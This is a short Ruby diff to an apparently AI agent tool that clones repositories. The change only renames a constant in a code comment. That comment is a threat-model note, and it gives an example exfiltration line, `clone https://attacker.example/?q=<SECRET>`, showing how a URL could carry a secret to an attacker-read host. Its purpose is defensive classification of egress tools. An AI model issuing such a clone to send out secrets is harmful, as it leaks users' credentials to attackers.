@@ -90,7 +90,7 @@ module Pikuri
                               'Other schemes are refused.'
           },
           execute: ->(url:) { execute_clone(url: url) },
-          # A *readable* egress verb, same family as {Pikuri::Tool::FETCH} and
+          # A *readable* egress verb, same family as {Pikuri::Web::FETCH} and
           # not a softer one: the clone host is chosen by whoever wrote the URL,
           # so `clone https://attacker.example/?q=<SECRET>` reaches a server the
           # attacker reads. The cloned tree is then attacker-authored content.
